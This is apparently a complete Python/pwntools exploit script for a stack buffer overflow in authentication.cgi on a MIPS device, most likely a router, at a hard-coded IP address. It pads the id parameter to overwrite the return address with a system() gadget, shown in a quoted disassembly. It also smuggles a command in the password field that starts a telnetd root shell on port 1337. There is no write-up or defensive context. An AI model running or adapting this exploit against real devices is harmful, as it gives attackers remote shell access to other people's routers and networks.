import requests
from pwn import *
context.log_level='debug'
"111.184.165.87,test"
def write2stack(payload,id):
    headers={
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36",
    }
 
    url = 'http://111.184.165.87/authentication.cgi'
    params = {"id": id,"password":payload}
    response = requests.get(url=url, params=params, headers=headers,timeout=6).text
    print(response)

"""
.text:00413F1C                 lw      $gp, 0x420+var_410($sp)
.text:00413F20                 nop
.text:00413F24                 la      $t9, system
.text:00413F28                 nop
.text:00413F2C                 jalr    $t9 ; system
.text:00413F30                 move    $a0, $s0         # command
.text:00413F34                 lw      $ra, 0x420+var_s4($sp)
.text:00413F38                 lw      $gp, 0x420+var_410($sp)
.text:00413F3C                 lw      $s0, 0x420+var_s0($sp)
.text:00413F40                 jr      $ra
.text:00413F44                 addiu   $sp, 0x428
"""

payload=cyclic(1052,n=4)#+b'\x0a'
payload+=p32(0x413f24) #ret1
payload+=p32(0x22222222)
id=b"a"*1024+payload
password=b"/usr/sbin/telnetd${IFS}-l${IFS}/bin/sh${IFS}-p${IFS}1337;".ljust(1024,b' ')+p64(0x43a190)#s0   0x439920
write2stack(password,id)